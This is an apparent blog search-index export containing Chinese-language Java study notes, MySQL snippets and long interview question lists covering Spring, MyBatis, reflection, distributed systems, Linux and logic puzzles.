hints.put(DecodeHintType.CHARACTER_SET, CHARSET); result = new MultiFormatReader().decode(bitmap, hints); String resultStr = result.getText(); return resultStr; &#125; /** * 解析二维码 * * @param path * 二维码图片地址 * @return * @throws Exception */ public static String decode(String path) throws Exception &#123; return QRCodeUtil.decode(new File(path)); &#125; public static void main(String[] args) throws Exception &#123; String text = &quot;http://www.lrshuai.top?kw=哈哈|新年快乐||哈哈&quot;; //不含Logo //QRCodeUtil.encode(text, null, &quot;e:\\&quot;, true); //含Logo，不指定二维码图片名 //QRCodeUtil.encode(text, &quot;e:\\csdn.jpg&quot;, &quot;e:\\&quot;, true); //含Logo，指定二维码图片名 QRCodeUtil.encode(text, &quot;E:\\lrs_img\\16.png&quot;, &quot;e:\\&quot;, &quot;qrcode&quot;, true); &#125; &#125;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql 零散笔记]]></title>
    <url>%2Fblog%2F2018%2F01%2F04%2FMysql%20%E9%9B%B6%E6%95%A3%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Mysql 零散笔记一、小数点不够自动补零1、FORMAT12# 第二个参数是 保留几位小数 ，---&gt; &apos;12,332.1235&apos;SELECT FORMAT(12332.123456, 4); 2、truncate12# 输出 ----&gt;4545.13select truncate(4545.1366,2); 3、convert12# 第二个参数可以填有很多类型，DECIMAL(15,2) 中的2 是两位小数点select convert(15645.1246,DECIMAL(15,2)); 二、字符串拼接1、concat1234select concat(&apos;￥&apos;,8898898.15) as RMB# 查询a.name LIKE CONCAT(CONCAT(&apos;%&apos;, #&#123;keyword&#125;),&apos;%&apos;)]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 面试题之后篇]]></title>
    <url>%2Fblog%2F2018%2F01%2F03%2FJava%20%E9%9D%A2%E8%AF%95%E9%A2%98%E4%B9%8B%E5%90%8E%E7%AF%87%2F</url>
    <content type="text"><![CDATA[Java 面试高级篇三、开源框架和容器3.1、SSM/Servlet Servlet的生命周期 1、new 实例化Servlet2、Servlet 通过调用 init () 方法进行初始化。3、Servlet 调用 service() 方法来处理客户端的请求。4、Servlet 通过调用 destroy() 方法终止（结束）。5、最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的 转发与重定向的区别 转发是服务器行为，重定向是客户端行为重定向，其实是两次request,请求转发共享相同的request对象和response对象我也说得不是很好，可以度娘或者按自己得理解 Spring 中BeanFactory 和 ApplicationContext 有什么区别 BeanFacotry是spring中比较原始的Factory,原始的BeanFactory无法支持spring的许多插件，如AOP功能、Web应用等。ApplicationContext接口,它由BeanFactory接口派生而来，因而提供BeanFactory所有的功能。还提供了以下的功能:1.利用MessageSource进行国际化2.强大的事件机制(Event)3.底层资源的访问4.对Web应用的支持5、BeanFactroy采用的是延迟加载形式来注入Bean的，而ApplicationContext则相反，容器启动时，一次性创建了所有的Bean。这样，在容器启动时，我们就可以发现Spring中存在的配置错误。6.BeanFactory和ApplicationContext都支持BeanPostProcessor、BeanFactoryPostProcessor的使用，但两者之间的区别是：BeanFactory需要手动注册，而ApplicationContext则是自动注册 Spring Bean 的生命周期 1：Bean的建立： 容器寻找Bean的定义信息并将其实例化。2：属性注入： 使用依赖注入，Spring按照Bean定义信息配置Bean所有属性3：BeanNameAware的setBeanName()： 如果Bean类有实现org.springframework.beans.BeanNameAware接口，工厂调用Bean的setBeanName()方法传递Bean的ID。4：BeanFactoryAware的setBeanFactory()： 如果Bean类有实现org.springframework.beans.factory.BeanFactoryAware接口，工厂调用setBeanFactory()方法传入工厂自身。5：BeanPostProcessors的ProcessBeforeInitialization() 如果有org.springframework.beans.factory.config.BeanPostProcessors和Bean关联，那么其postProcessBeforeInitialization()方法将被将被调用。6：initializingBean的afterPropertiesSet()： 如果Bean类已实现org.springframework.beans.factory.InitializingBean接口，则执行他的afterProPertiesSet()方法7：Bean定义文件中定义init-method： 可以在Bean定义文件中使用”init-method”属性设定方法名称例如： 如果有以上设置的话，则执行到这个阶段，就会执行initBean()方法8：BeanPostProcessors的ProcessaAfterInitialization() 如果有任何的BeanPostProcessors实例与Bean实例关联，则执行BeanPostProcessors实例的ProcessaAfterInitialization()方法9：DisposableBean的destroy() 在容器关闭时，如果Bean类有实现org.springframework.beans.factory.DisposableBean接口，则执行他的destroy()方法参考:https://www.cnblogs.com/kenshinobiy/p/4652008.html Spring的bean的创建时机？依赖注入的时机？ 1、在默认的情况下，启动spring容器创建对象。2、在spring的配置文件bean中有一个属性 lazy-init=”default/true/false”如果 lazy-init = default/false ，在启动spring容器时创建对象。为 true 时，在 context.getBean() 时才创建对象。依赖注入在以下两种情况发生：(1).用户第一次通过getBean方法向IoC容索要Bean时，IoC容器触发依赖注入。(2).当用户在Bean定义资源中为元素配置了lazy-init属性，即让容器在解析注册Bean定义时进行预实例化，触发依赖注入。 Spring IOC 如何实现 依赖注入的思想好像是通过反射机制实现的，这个我得水平好像没到。可以参考文章：https://www.cnblogs.com/ITtangtang/p/3978349.html Spring IoC涉及到的设计模式； 工厂模式、单利模式。。 Spring中Bean的作用域，默认的是哪一个 1、singleton：单例模式，在整个Spring IoC容器中，使用singleton定义的Bean将只有一个实例2、prototype：原型模式，每次通过容器的getBean方法获取prototype定义的Bean时，都将产生一个新的Bean实例3、request：对于每次HTTP请求，使用request定义的Bean都将产生一个新实例，即每次HTTP请求将会产生不同的Bean实例。只有在Web应用中使用Spring时，该作用域才有效4、session：对于每次HTTP Session，使用session定义的Bean豆浆产生一个新实例。同样只有在Web应用中使用Spring时，该作用域才有效5、globalsession：每个全局的HTTP Session，使用session定义的Bean都将产生一个新实例。典型情况下，仅在使用portlet context的时候有效。同样只有在Web应用中使用Spring时，该作用域才有效模式的是单例模式（singleton） 说说 Spring AOP、实现原理 笔者的水平不够可参考：https://blog.csdn.net/fighterandknight/article/details/51209822 动态代理（CGLib 与 JDK）、优缺点、性能对比、如何选择 从 jdk6 到 jdk7、jdk8 ，动态代理的性能得到了显著的提升，而 cglib 的表现并未跟上，甚至可能会略微下降是否正确，自行决断，笔者水平一般，参考：https://www.cnblogs.com/haiq/p/4304615.html Spring 事务实现方式、事务的传播机制、默认的事务类别 现实方式有:声明式事务和编程式事务？六种事务传播机制：PROPAGATION_REQUIRED – 支持当前事务，如果当前没有事务，就新建一个事务。这是最常见的选择。PROPAGATION_SUPPORTS – 支持当前事务，如果当前没有事务，就以非事务方式执行。PROPAGATION_MANDATORY – 支持当前事务，如果当前没有事务，就抛出异常PROPAGATION_REQUIRES_NEW – 新建事务，如果当前存在事务，把当前事务挂起。PROPAGATION_NOT_SUPPORTED – 以非事务方式执行操作，如果当前存在事务，就把当前事务挂起。PROPAGATION_NEVER – 以非事务方式执行，如果当前存在事务，则抛出异常。PROPAGATION_NESTED – 如果当前存在事务，则在嵌套事务内执行。如果当前没有事务，则进行与PROPAGATION_REQUIRED类似的操作参考自：https://blog.csdn.net/yuanlaishini2010/article/details/45792069 Spring 事务底层原理 不行了，来个大腿 Spring事务失效（事务嵌套），JDK动态代理给Spring事务埋下的坑 不知道什么坑。。。 如何自定义注解实现功能 以后来写 Spring MVC 运行流程 1.spring mvc将所有的请求都提交给DispatcherServlet,它会委托应用系统的其他模块负责对请求 进行真正的处理工作。2.DispatcherServlet查询一个或多个HandlerMapping,找到处理请求的Controller.3.DispatcherServlet请请求提交到目标Controller4.Controller进行业务逻辑处理后，会返回一个ModelAndView5.Dispathcher查询一个或多个ViewResolver视图解析器,找到ModelAndView对象指定的视图对象6.视图对象负责渲染返回给客户端。 Spring MVC 启动流程 1.Web容器初始化过程2.SpringMVC中web.xml配置3.认识ServletContextListener4.认识ContextLoaderListener5.DispatcherServlet初始化（HttpServletBean • FrameworkServlet • DispatcherServlet）6.ContextLoaderListener与DispatcherServlet关系7.DispatcherServlet的设计8.DispatcherServlet工作原理 Spring 的单例实现原理 Spring对bean实例的创建是采用单例注册表的方式进行实现的，而这个注册表的缓存是HashMap对象，如果配置文件中的配置信息不要求使用单例，Spring会采用新建实例的方式返回对象实例参考：https://blog.csdn.net/cs408/article/details/48982085 Spring 框架中用到了哪些设计模式 代理模式—在AOP和remoting中被用的比较多。单例模式—在spring配置文件中定义的bean默认为单例模式。模板方法—用来解决代码重复的问题。比如. RestTemplate, JmsTemplate, JpaTemplate。工厂模式—BeanFactory用来创建对象的实例。适配器–spring aop装饰器–spring data hashmapper观察者– spring 时间驱动模型回调–Spring ResourceLoaderAware回调接口 Spring 其他产品 Srping Boot、Spring Cloud、Spring Secuirity、Spring Data、Spring AMQP 等 有没有用到Spring Boot，Spring Boot的认识、原理 这个不是一两句话能说清的。可参考：https://www.cnblogs.com/zheting/p/6707035.html Spring中 Resource注解和Autowired注解的区别 @Resource默认按照名称方式进行bean匹配，@Autowired默认按照类型方式进行bean匹配@Resource是J2EE的注解,@Autowired是Spring的注解 如果一个接⼝有2个不同的实现, 那么怎么来Autowire一个指定的实现？ (可以使用Qualifier注解限定要注入的Bean，也可以使用Qualifier和Autowire注解指定要获取的bean，也可以使用Resource注解的name属性指定要获取的Bean) Spring声明一个 bean 如何对其进行个性化定制； init-method属性指定了在初始化bean时要调用的方法，类似的，destroy-method属性指定了bean从容器移除之前要调用的方法。 MyBatis有什么优势； 优点： 易于上手和掌握。 sql写在xml里，便于统一管理和优化。 解除sql与程序代码的耦合。 提供映射标签，支持对象与数据库的orm字段关系映射 提供对象关系映射标签，支持对象关系组建维护 提供xml标签，支持编写动态sql。 缺点： sql工作量很大，尤其是字段多、关联表多时，更是如此。 sql依赖于数据库，导致数据库移植性差。 由于xml里标签id必须唯一，导致DAO中方法不支持方法重载。 字段映射标签和对象关系映射标签仅仅是对映射关系的描述，具体实现仍然依赖于sql。（比如配置了一对多Collection标签，如果sql里没有join子表或查询子表的话，查询后返回的对象是不具备对象关系的，即Collection的对象为null） DAO层过于简单，对象组装的工作量较大。 不支持级联更新、级联删除。 编写动态sql时,不方便调试，尤其逻辑复杂时。8 提供的写动态sql的xml标签功能简单（连struts都比不上），编写动态sql仍然受限，且可读性低。 若不查询主键字段，容易造成查询出的对象有“覆盖”现象。 参数的数据类型支持不完善。（如参数为Date类型时，容易报没有get、set方法，需在参数上加@param） 多参数时，使用不方便，功能不够强大。（目前支持的方法有map、对象、注解@param以及默认采用012索引位的方式） 缓存使用不当，容易产生脏数据。 MyBatis如何做事务管理； MyBatis单独使用时，使用SqlSession来处理事务：和Spring集成后，使用Spring的事务管理 MyBatis怎么防止SQL注入； 使用#{}语法,MyBatis会产生PreparedStatement语句中，并且安全的设置PreparedStatement参数，这个过程中MyBatis会进行必要的安全检查和转义简单说，#{}是经过预编译的，是安全的；${}是未经过预编译的，仅仅是取变量的值，是非安全的，存在SQL注入 Mybatis 的工作原理 1、XMLConfigBuilder对象会进行XML配置文件的解析2、在configuration节点下会依次解析properties/settings/…/mappers等节点配置，并存到configuration对象3、使用Configuration对象去创建SqlSessionFactory。4、SqlSession通过SqlSessionFactory的opensession方法返回的5、MapperProxy 通过SqlSession这个具体实现类DefaultSqlSession的getMapper来获取动态代理对象6、MapperProxy的invoke方法最终会被代理对象调用，7、invoke 方法中调用MapperMethod.execute(sqlsession,args) 执行,得到最终的处理结果可参考：https://www.jianshu.com/p/a6b5e066c3d9 Mybtis缓存机制 mybatis的缓存分为两级：一级缓存、二级缓存。一级缓存是SqlSession级别的缓存，缓存的数据只在SqlSession内有效(默认是开启一级缓存)二级缓存是mapper级别的缓存，同一个namespace公用这一个缓存，所以对SqlSession是共享的(默认是没有开启的) Mybtis 常用的动态标签 1,foreach用来循环容器的标签2,concat模糊查詢3,choose(when,otherwise)标签4,if标签5,selectKey标签 3.2、Netty 为什么选择 Netty 说说业务中，Netty 的使用场景 原生的 NIO 在 JDK 1.7 版本存在 epoll bug 什么是TCP 粘包/拆包 TCP粘包/拆包的解决办法 Netty 线程模型 说说 Netty 的零拷贝 Netty 内部执行流程 Netty 重连实现 3.3、Tomcat Tomcat的基础架构（Server、Service、Connector、Container） Tomcat如何加载Servlet的 Pipeline-Valve机制 可参考：《四张图带你了解Tomcat系统架构！》 四、分布式4.1、Nginx 请解释什么是C10K问题或者知道什么是C10K问题吗？ Nginx简介，可参考《Nginx简介》 正向代理和反向代理. Nginx几种常见的负载均衡策略 Nginx服务器上的Master和Worker进程分别是什么 使用“反向代理服务器”的优点是什么? 常见的Nginx负载均衡策略；已有两台Nginx服务器了，倘若这时候再增加一台服务器，采用什么负载均衡算法比较好？ 4.2、分布式其他 谈谈业务中使用分布式的场景 Session 分布式方案 Session 分布式处理 分布式锁的应用场景、分布式锁的产生原因、基本概念 分布是锁的常见解决方案 分布式事务的常见解决方案 集群与负载均衡的算法与实现 说说分库与分表设计，可参考《数据库分库分表策略的具体实现方案》 分库与分表带来的分布式困境与应对之策 如何保证分布式缓存的一致性(分布式缓存一致性hash算法?)？分布式session实现？ Solr如何实现全天24小时索引更新； 4.3、Dubbo 什么是Dubbo，可参考《Dubbo入门》 什么是RPC、如何实现RPC、RPC 的实现原理，可参考《基于HTTP的RPC实现》 Dubbo中的SPI是什么概念 Dubbo的基本原理、执行流程 五、微服务5.1、微服务 前后端分离是如何做的？ 微服务哪些框架 Spring Could的常见组件有哪些？可参考《Spring Cloud概述》 领域驱动有了解吗？什么是领域驱动模型？充血模型、贫血模型 JWT有了解吗，什么是JWT，可参考《前后端分离利器之JWT》 你怎么理解 RESTful 说说如何设计一个良好的 API 如何理解 RESTful API 的幂等性 如何保证接口的幂等性 说说 CAP 定理、BASE 理论 怎么考虑数据一致性问题 说说最终一致性的实现方案 微服务的优缺点，可参考《微服务批判》 微服务与 SOA 的区别 如何拆分服务、水平分割、垂直分割 如何应对微服务的链式调用异常 如何快速追踪与定位问题 如何保证微服务的安全、认证 5.2、安全问题 如何防范常见的Web攻击、如何方式SQL注入 服务端通信安全攻防 HTTPS原理剖析、降级攻击、HTTP与HTTPS的对比 5.3、性能优化 性能指标有哪些 如何发现性能瓶颈 性能调优的常见手段 说说你在项目中如何进行性能调优 六、其他6.1、设计能力 说说你在项目中使用过的UML图 你如何考虑组件化、服务化、系统拆分 秒杀场景如何设计 如何防止表单重复提交（Token令牌环等方式）； 有一个url白名单，需要使用正则表达式进行过滤，但是url量级很大，大概亿级，那么如何优化正则表达式？如何优化亿级的url匹配呢？ 可参考：《秒杀系统的技术挑战、应对策略以及架构设计总结一二！》 6.2、业务工程 说说你的开发流程、如何进行自动化部署的 你和团队是如何沟通的 你如何进行代码评审 说说你对技术与业务的理解 说说你在项目中遇到感觉最难Bug，是如何解决的 介绍一下工作中的一个你认为最有价值的项目，以及在这个过程中的角色、解决的问题、你觉得你们项目还有哪些不足的地方 6.3、软实力 说说你的优缺点、亮点 说说你最近在看什么书、什么博客、在研究什么新技术、再看那些开源项目的源代码 说说你觉得最有意义的技术书籍 工作之余做什么事情、平时是如何学习的，怎样提升自己的能力 说说个人发展方向方面的思考 说说你认为的服务端开发工程师应该具备哪些能力 说说你认为的架构师是什么样的，架构师主要做什么 如何看待加班的问题 七、操作系统 Linux静态链接和动态链接； 什么是IO多路复用模型（select、poll、epoll）； Linux中的grep管道用处？Linux的常用命令？ 操作系统中虚拟地址、逻辑地址、线性地址、物理地址的概念及区别； 内存的页面置换算法； 进程调度算法，操作系统是如何调度进程的； 父子进程、孤儿进程、僵死进程等概念； fork进程时的操作； kill用法，某个进程杀不掉的原因（僵死进程；进入内核态，忽略kill信号）； 系统管理命令（如查看内存使用、网络情况）； find命令、awk使用； Linux下排查某个死循环的线程； 为什么要内存对齐； 为什么会有大端小端，htol这一类函数的作用； top显示出来的系统信息都是什么含义；（重要！） Linux地址空间，怎么样进行寻址的； Linux如何查找目录或者文件的； Linux下可以在/proc目录下可以查看CPU的核心数等；cat /proc/下边会有很多系统内核信息可供显示； 说一下栈的内存是怎么分配的； Linux各个目录有了解过吗？/etc、/bin、/dev、/lib、/sbin这些常见的目录主要作用是什么？ 说一下栈帧的内存是怎么分配的； Linux下排查某个死循环的线程； 八、系统设计开放性题目 秒杀系统设计，超卖怎么搞; 你们的图片时怎么存储的，对应在数据库中时如何保存图片的信息的？ 假如成都没有一座消防站，现在问你要建立几座消防站，每个消防站要配多少名消防官兵，多少辆消防车，请你拿出一个方案； 基于数组实现一个循环阻塞队列； 常见的ipv4地址的展现形式如“168.0.0.1”，请实现ip地址和int类型的相互转换。（使用位移的方式） 现网某个服务部署在多台Liunx服务器上，其中一台突然出现CPU 100%的情况，而其他服务器正常，请列举可能导致这种情况发生的原因？如果您遇到这样的情况，应如何定位？内存？CPU？发布？debug？请求量？ 九、大数据量问题（后边会有专题单独讨论） 给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？ 海量日志数据，提取出某日访问百度次数最多的那个IP； 一个文本文件，大约有一万行，每行一个词，要求统计出其中最频繁出现的前10个词，请给出思想，给出时间复杂度分析。 此话题后边会有专门的文章探讨，如果有等不及的小伙伴，可以移步参考： 1、https://blog.csdn.net/v_july_v/article/details/6279498 2、https://blog.csdn.net/v_july_v/article/details/7382693 十、逻辑思维题 有两根粗细均匀的香（烧香拜佛的香），每一根烧完都花一个小时，怎么样能够得到15min？ 假定你有8个撞球，其中有1个球比其他的球稍重,如果只能利用天平来断定哪一个球重,要找到较重的球,要称几次?（2次）； 实验室里有1000个一模一样的瓶子，但是其中的一瓶有毒。可以用实验室的小白鼠来测试哪一瓶是毒药。如果小白鼠喝掉毒药的话，会在一个星期的时候死去，其他瓶子里的药水没有任何副作用。请问最少用多少只小白鼠可以在一个星期以内查出哪瓶是毒药；（答案是10只） 假设有一个池塘，里面有无穷多的水。现有2个空水壶，容积分别为5升和6升。问题是如何只用这2个水壶从池塘里取得3升的水； 面试题前篇的链接：http://lrshuai.top/atc/show/109]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 面试题之前篇]]></title>
    <url>%2Fblog%2F2018%2F01%2F03%2FJava%20%E9%9D%A2%E8%AF%95%E9%A2%98%E4%B9%8B%E5%89%8D%E7%AF%87%2F</url>
    <content type="text"><![CDATA[Java 面试题大全这个面试题，是通过网络上收集的，但是下面的参考答案也是我通过网上收集与结合我自己的理解填上的，如若有错，欢迎指正，水平有限请见谅。第一阶段一、基础篇1.1、Java基础 面向对象的特征：继承、封装和多态 1、封装封装就是将数据与操作数据的源代码进行有机的结合，形成类，其中数据和函数都是类的成员。隐藏了类的实现，类的使用者只需知道公共的接口，就可以使用该类；封装帮助防止意外的改变和误用；对程序调试有很大的帮助，因为改变类的成员变量只用通过公共接口。 好处： 将变化隔离。 便于使用。 提高重用性。 提高安全性。 2、继承继承是指可以使用现有类的所有功能，可以使一个对象直接使用另一个对象的属性和方法。通过继承创建的新类称为“子类”或者“派生类”，被继承的类称为“基类”或者“父类”。 好处 提高了代码的复用性。 让类与类之间产生了关系，提供了多态的前提。 特点 Java只支持单继承，不支持多继承。 因为如果可以多继承，就会出现调用不明确的问题。 Java支持多重继承（继承体系） 3、多态在同一个方法中，由于参数不同而导致执行效果各异的现象就是多态。 前提条件： A:要有继承关系。 B:要有方法重写。 C:要有父类引用指向子类对象。 优点： 提高代码的扩展性和可维护性。 弊端： 父类引用不能使用子类特有功能。 final, finally, finalize 的区别 1、finalfinal关键字可以用来修饰类，方法以及成员变量，当用在不同的场景下时具有不同的意义。 修饰类如果修饰类，则代表这个类不可继承 修饰方法如果修饰方法，则代表这个方法不可覆写；同时，允许编译器将所有对这个方法的调用转化为inline调用，也就是说，把所有的调用处的方法名全部换为方法主体，这也会使得代码主体变得异常庞大，非常影响性能。 修饰变量如果修饰基本类型，则代表该变量的值不可改变。如果修饰引用类型，则代表该对象的引用不可改变。 2、finallyfinally是用于异常处理时使用的语句，由finally关键词修饰的代码主体，无论异常是否发生，该代码块总会执行。注意：哪怕try/catch中存在return，finally修饰的代码块依然会执行。 具体情况可以如下： finally中包含return语句，则无论之前try语句中是否包含retrun，都不再执行，只执行finally中的return。 finally中不包含return语句，也没有改变try中的返回值，则finally中的语句执行完后会继续执行try中的return。 finally中不包含return语句，但是改变了try中的返回值，则finally中的语句执行完后会继续执行try中的return，并通过return继续返回值（此处类似函数调用，如果finally改变的返回值是基本类型，则改变不起作用；如果是引用类型，则finally中对该引用类型的属性值的改变起作用）。 3、finalizefinalize是一个方法名，当需要从堆中永久删除某个对象之前，垃圾回收器会主动调用该对象的finalize()方法。 需要注意的是：程序猿无法确定垃圾回收器何时调用该方法（哪怕你明着写出来，依然无法确定，所以一般程序猿不需要调用该方法）无法保证调用不同对象的方法的顺序。换句话说如果对象A里面引用了对象B，则有可能先调用A的finalize()方法，也有可能先调用B的finalize()方法。 Exception、Error、运行时异常与一般异常有何异同 Throwable是Java错误处理的父类，有两个子类：Error和Exception。Error：无法预期的严重错误，导致JVM虚拟机无法继续执行，几乎无法恢复捕捉的Exception：可恢复捕捉的。java健壮程序的手段。Java提供了两类主要的异常:runtime exception和checked exception （编译时被检查的异常）。 checked exception （编译时被检查的异常）：JAVA编译器强制要求我们必需对出现的这些异常进行catch或throws。所以，面对这种异常不管我们是否愿意，只能写一大堆catch块或throws去处理可能的异常。如IO异常，以及SQL异常等。 runtime exception：编译通过，但运行通不过，出现RuntimeException,通常是程序员出错。虚拟机接管会终止线程或主程序。如错误的类型转换、数组越界访问和访问空指针等 请写出5种常见到的runtime exception 最常见到的runtime exception NullPointerException12int a1[]=null;System.out.print(a1[2]); ArrayIndexOutOfBoundsException 1234int a[]=&#123;2,3,5,32,6&#125;;for (int i = 0; i &lt;6; i++)&#123; System.out.print(a[i]);&#125; ClassCastException 12Object i=new Integer(1);System.out.println((String)i); ArithmeticException 1int a=5/0; NegativeArraySizeException 1String[] s=new String[-10]; int 和 Integer 有什么区别，Integer的值缓存范围 int与Integer的基本使用对比 Integer是int的包装类；int是基本数据类型； Integer变量必须实例化后才能使用；int变量不需要； Integer实际是对象的引用，指向此new的Integer对象；int是直接存储数据值 ； Integer的默认值是null；int的默认值是0。 int与Integer的深入对比 由于Integer变量实际上是对一个Integer对象的引用，所以两个通过new生成的Integer变量永远是不相等的（因为new生成的是两个对象，其内存地址不同）。 Integer变量和int变量比较时，只要两个变量的值是相等的，则结果为true（因为包装类Integer和基本数据类型int比较时，java会自动拆包装为int，然后进行比较，实际上就变为两个int变量的比较） 非new生成的Integer变量和new Integer()生成的变量比较时，结果为false。（因为非new生成的Integer变量指向的是java常量池中的对象，而new Integer()生成的变量指向堆中新建的对象，两者在内存中的地址不同） 对于两个非new生成的Integer对象，进行比较时，如果两个变量的值在区间-128到127之间，则比较结果为true，如果两个变量的值不在此区间，则比较结果为false原因： java在编译Integer i = 100 ;时，会翻译成为Integer i = Integer.valueOf(100)。而java API中对Integer类型的valueOf的定义如下，对于-128到127之间的数，会进行缓存，Integer i = 127时，会将127进行缓存，下次再写Integer j = 127时，就会直接从缓存中取，就不会new了。归结于java对于Integer与int的自动装箱与拆箱的设计，是一种模式：叫享元模式（flyweight）。加大对简单数字的重利用，Java定义在自动装箱时对于值从–128到127之间的值，它们被装箱为Integer对象后，会存在内存中被重用，始终只存在一个对象。而如果超过了从–128到127之间的值，被装箱后的Integer对象并不会被重用，即相当于每次装箱时都新建一个 Integer对象。 包装类，装箱和拆箱 自动装箱：将基本数据类型重新转化为对象自动拆箱：将对象重新转化为基本数据类型 String、StringBuilder、StringBuffer String 字符串常量StringBuffer 字符串变量（线程安全）StringBuilder 字符串变量（非线程安全） 三者在执行速度方面的比较：StringBuilder &gt; StringBuffer &gt; StringJava中对String对象进行的操作实际上是一个不断创建新的对象并且将旧的对象回收的一个过程，所以执行速度很慢。 如果操作少量的数据用String 单线程下操作大量的数据用StringBuilder 多线程下操作大量的数据用StringBuffer 重载和重写的区别 override（重写） 方法名、参数、返回值相同。 子类方法不能缩小父类方法的访问权限。 子类方法不能抛出比父类方法更多的异常(但子类方法可以不抛出异常)。 存在于父类和子类之间。 方法被定义为final不能被重写。 overload（重载） 参数类型、个数、顺序至少有一个不相同。 不能重载只有返回值不同的方法名。 存在于父类和子类、同类中。 抽象类和接口有什么区别 接口和抽象类的概念不一样。接口是对动作的抽象，抽象类是对根源的抽象抽象类表示的是，这个对象是什么。接口表示的是，这个对象能做什么 接口是抽象类的变体，接口中所有的方法都是抽象的。而抽象类是声明方法的存在而不去实现它的类。 接口可以多继承，抽象类不行 接口定义方法，不能实现，而抽象类可以实现部分方法。 接口中基本数据类型为static 而抽类象不是的 说说反射的用途及实现 反射反射的概念是由Smith在1982年首次提出的，主要是指程序可以访问、检测和修改其本身状态或行为的一种能力反射机制允许程序在执行时获取某个类自身的定义信息，例如属性和方法等也可以实现动态创建类的对象、变更属性的内容或执行特定的方法的功能。从而使Java具有动态语言的特性，增强了程序的灵活性和可移植性。 反射的主要用途 反射最重要的用途就是开发各种通用框架比如Spring 框架，为了保证框架的通用性，他们可能根据配置文件加载不同的对象或类，调用不同的方法，这个时候就必须用到反射——运行时动态加载需要加载的对象。 当我们在使用 IDE（如 Eclipse\IDEA）时，当我们输入一个队长或者类并向调用它的属性和方法时，一按 (“.”)点号，编译器就会自动列出她的属性或方法，这里就会用到反射。 反射机制的作用Java反射机制主要用于实现以下功能。 在运行时判断任意一个对象所属的类型。 在运行时构造任意一个类的对象。 在运行时判断任意一个类所具有的成员变量和方法。 在运行时调用任意一个对象的方法，甚至可以调用private方法。反射的核心：是 JVM 在运行时 才动态加载的类或调用方法或属性，他不需要事先（写代码的时候或编译期）知道运行对象是谁 Java反射机制API实现Java反射机制的API在Java.lang.reflect包下，具有以下几点。 Class类：代表一个类。 Filed类：代表类的成员变量。 Method类：代表类的方法。 Constructor类：代表类的构造方法。 Array类：提供了动态创建数组及访问数组元素的静态方法。该类中的所有方法都是静态的。 反射的实现1、获得Class对象有3种方法： 使用Class类的forName静态方法: 如JDBC开发中常用此方法加载数据库驱动:Class.forName(driver); 直接获取某一个对象的class，比如: Class&lt;?&gt; klass = int.class; Class&lt;?&gt; classInt = Integer.TYPE; 调用某个对象的getClass()方法,比如: StringBuilder str = new StringBuilder(“abc”); Class&lt;?&gt; klass = str.getClass(); 2、判断是否为某个类的实例一般地，我们用instanceof关键字来判断是否为某个类的实例。同时我们也可以借助反射中Class对象的isInstance()方法来判断是否为某个类的实例，它是一个Native方法（被native关键字修饰的方法叫做本地方法，另外native方法在JVM中运行时数据区也和其它方法不一样，它有专门的本地方法栈。native方法主要用于加载文件和动态链接库，由于Java语言无法访问操作系统底层信息。比如：底层硬件设备等，这时候就需要借助C语言来完成了。被native修饰的方法可以被C语言重写）：1public native boolean isInstance(Object obj); 3、创建实例 使用Class对象的newInstance()方法来创建Class对象对应类的实例。12Class&lt;?&gt; c = String.class;Object str = c.newInstance(); 先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法来创建实例。这种方法可以用指定的构造器构造类的实例。1234567//获取String所对应的Class对象Class&lt;?&gt; c = String.class;//获取String类带一个String参数的构造器Constructor constructor = c.getConstructor(String.class);//根据构造器创建实例Object obj = constructor.newInstance(&quot;23333&quot;);System.out.println(obj); 4、获取方法获取某个Class对象的方法集合，主要有以下几个方法： getDeclaredMethods()方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法1public Method[] getDeclaredMethods() throws SecurityException getMethods()方法返回某个类的所有公用（public）方法，包括其继承类的公用方法 1public Method[] getMethods() throws SecurityException getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象 1public Method getMethod(String name, Class&lt;?&gt;... parameterTypes) 5、获取构造器信息获取类构造器的用法与上述获取方法的用法类似。主要是通过Class类的getConstructor方法得到Constructor类的一个实例，而Constructor类有一个newInstance方法可以创建一个对象实例: 6、获取类的成员变量（字段）信息主要是这几个方法，在此不再赘述：getFiled: 访问公有的成员变量getDeclaredField：所有已声明的成员变量。但不能得到其父类的成员变量getFileds和getDeclaredFields用法同上（参照Method） 7、调用方法当我们从类中获取了一个方法后，我们就可以用invoke()方法来调用这个方法。栗子123456789101112131415161718192021public class test1 &#123; public static void main(String[] args) throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123; Class&lt;?&gt; klass = methodClass.class; //创建methodClass的实例 Object obj = klass.newInstance(); //获取methodClass类的add方法 Method method = klass.getMethod(&quot;add&quot;,int.class,int.class); //调用method对应的方法 =&gt; add(1,4) Object result = method.invoke(obj,1,4); System.out.println(result); &#125;&#125;class methodClass &#123; public final int fuck = 3; public int add(int a,int b) &#123; return a+b; &#125; public int sub(int a,int b) &#123; return a+b; &#125;&#125; 详细可参考:这里 Java中的回调机制； 在一个应用系统中，无论使用何种语言开发，必然存在模块之间的调用，调用的方式分为几种： 同步调用同步调用是最基本并且最简单的一种调用方式，类A的方法a()调用类B的方法b()，一直等待b()方法执行完毕，a()方法继续往下走。这种调用方式适用于方法b()执行时间不长的情况，因为b()方法执行时间一长或者直接阻塞的话，a()方法的余下代码是无法执行下去的，这样会造成整个流程的阻塞。 异步调用异步调用是为了解决同步调用可能出现阻塞，导致整个流程卡住而产生的一种调用方式。类A的方法方法a()通过新起线程的方式调用类B的方法b()，代码接着直接往下执行，这样无论方法b()执行时间多久，都不会阻塞住方法a()的执行。但是这种方式，由于方法a()不等待方法b()的执行完成，在方法a()需要方法b()执行结果的情况下（视具体业务而定，有些业务比如启异步线程发个微信通知、刷新一个缓存这种就没必要），必须通过一定的方式对方法b()的执行结果进行监听。在Java中，可以使用Future+Callable的方式做到这一点 